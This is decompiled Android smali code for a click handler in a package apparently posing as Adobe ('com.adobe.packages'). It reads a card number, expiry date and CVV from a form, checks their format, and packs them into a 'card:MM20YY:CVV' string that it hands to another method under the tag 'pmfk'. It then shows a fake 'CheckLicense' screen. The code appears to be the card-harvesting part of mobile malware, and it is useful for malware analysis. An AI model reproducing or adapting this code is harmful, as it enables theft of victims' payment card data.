.class Lcom/adobe/packages/PM$1;
.super Ljava/lang/Object;
.source "PM.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/packages/PM;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/packages/PM;

.field private final synthetic val$cc:Landroid/widget/EditText;


# direct methods
.method constructor <init>(Lcom/adobe/packages/PM;Landroid/widget/EditText;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    iput-object p2, p0, Lcom/adobe/packages/PM$1;->val$cc:Landroid/widget/EditText;

    .line 81
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 15
    .param p1, "arg0"    # Landroid/view/View;

    .prologue
    .line 86
    const/4 v6, 0x0

    .line 87
    .local v6, "mm":I
    const/4 v8, 0x0

    .line 88
    .local v8, "yy":I
    const/4 v1, 0x0

    .line 89
    .local v1, "cvv":I
    const/4 v0, 0x0

    .line 91
    .local v0, "check":Z
    iget-object v9, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    const v10, 0x7f090010

    invoke-virtual {v9, v10}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/EditText;

    .line 92
    .local v3, "exp_mm":Landroid/widget/EditText;
    iget-object v9, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    const v10, 0x7f090011

    invoke-virtual {v9, v10}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/widget/EditText;

    .line 93
    .local v4, "exp_yy":Landroid/widget/EditText;
    iget-object v9, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    const v10, 0x7f090012

    invoke-virtual {v9, v10}, Lcom/adobe/packages/PM;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/EditText;

    .line 97
    .local v2, "exp_cvv":Landroid/widget/EditText;
    :try_start_0
    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v9

    invoke-interface {v9}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v6

    .line 98
    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v9

    invoke-interface {v9}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    .line 99
    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v9

    invoke-interface {v9}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v1

    .line 105
    :goto_0
    const/16 v9, 0xc

    if-gt v6, v9, :cond_0

    invoke-virtual {v3}, Landroid/widget/EditText;->length()I

    move-result v9

    const/4 v10, 0x2

    if-lt v9, v10, :cond_0

    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v9

    invoke-interface {v9}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v9

    const-string v10, "00"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 106
    :cond_0
    const-string v9, "#FF0000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v3, v9}, Landroid/widget/EditText;->setTextColor(I)V

    .line 107
    const/4 v0, 0x1

    .line 115
    :goto_1
    const/16 v9, 0x14

    if-gt v8, v9, :cond_1

    const/16 v9, 0xd

    if-lt v8, v9, :cond_1

    invoke-virtual {v4}, Landroid/widget/EditText;->length()I

    move-result v9

    const/4 v10, 0x2

    if-lt v9, v10, :cond_1

    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v9

    invoke-interface {v9}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v9

    const-string v10, "00"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_5

    .line 116
    :cond_1
    const-string v9, "#FF0000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v4, v9}, Landroid/widget/EditText;->setTextColor(I)V

    .line 117
    const/4 v0, 0x1

    .line 125
    :goto_2
    const/16 v9, 0xd

    if-ne v8, v9, :cond_6

    const/16 v9, 0xa

    if-ge v6, v9, :cond_6

    .line 126
    const-string v9, "#FF0000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v3, v9}, Landroid/widget/EditText;->setTextColor(I)V

    .line 127
    const/4 v0, 0x1

    .line 135
    :goto_3
    const/16 v9, 0x3e7

    if-gt v1, v9, :cond_2

    invoke-virtual {v2}, Landroid/widget/EditText;->length()I

    move-result v9

    const/4 v10, 0x3

    if-ge v9, v10, :cond_7

    .line 136
    :cond_2
    const-string v9, "#FF0000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v2, v9}, Landroid/widget/EditText;->setTextColor(I)V

    .line 137
    const/4 v0, 0x1

    .line 144
    :goto_4
    if-nez v0, :cond_3

    .line 149
    new-instance v5, Landroid/content/Intent;

    iget-object v9, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    invoke-virtual {v9}, Lcom/adobe/packages/PM;->getApplicationContext()Landroid/content/Context;

    move-result-object v9

    const-class v10, Lcom/adobe/packages/CheckLicense;

    invoke-direct {v5, v9, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 150
    .local v5, "intent":Landroid/content/Intent;
    const-string v9, "android.intent.action.VIEW"

    invoke-virtual {v5, v9}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 151
    const/high16 v9, 0x4000000

    invoke-virtual {v5, v9}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 152
    const/high16 v9, 0x40000000    # 2.0f

    invoke-virtual {v5, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 153
    const/high16 v9, 0x10000000

    invoke-virtual {v5, v9}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 154
    iget-object v9, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    invoke-virtual {v9, v5}, Lcom/adobe/packages/PM;->startActivity(Landroid/content/Intent;)V

    .line 156
    iget-object v9, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    const-string v10, "pmfk"

    new-instance v11, Ljava/lang/StringBuilder;

    iget-object v12, p0, Lcom/adobe/packages/PM$1;->val$cc:Landroid/widget/EditText;

    invoke-virtual {v12}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v12

    invoke-interface {v12}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v12

    const-string v13, " "

    const-string v14, ""

    invoke-virtual {v12, v13, v14}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v12, ":"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v3}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "20"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, ":"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    iget-object v12, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    invoke-virtual {v12}, Lcom/adobe/packages/PM;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    invoke-static {v9, v10, v11, v12}, Lcom/adobe/packages/PM;->access$0(Lcom/adobe/packages/PM;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 157
    iget-object v9, p0, Lcom/adobe/packages/PM$1;->this$0:Lcom/adobe/packages/PM;

    invoke-virtual {v9}, Lcom/adobe/packages/PM;->finish()V

    .line 161
    .end local v5    # "intent":Landroid/content/Intent;
    :cond_3
    return-void

    .line 100
    :catch_0
    move-exception v7

    .line 101
    .local v7, "nfe":Ljava/lang/NumberFormatException;
    sget-object v9, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v10, "reich_error"

    invoke-virtual {v9, v10}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 111
    .end local v7    # "nfe":Ljava/lang/NumberFormatException;
    :cond_4
    const-string v9, "#000000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v3, v9}, Landroid/widget/EditText;->setTextColor(I)V

    goto/16 :goto_1

    .line 121
    :cond_5
    const-string v9, "#000000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v4, v9}, Landroid/widget/EditText;->setTextColor(I)V

    goto/16 :goto_2

    .line 131
    :cond_6
    const-string v9, "#000000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v3, v9}, Landroid/widget/EditText;->setTextColor(I)V

    goto/16 :goto_3

    .line 141
    :cond_7
    const-string v9, "#000000"

    invoke-static {v9}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v2, v9}, Landroid/widget/EditText;->setTextColor(I)V

    goto/16 :goto_4
.end method
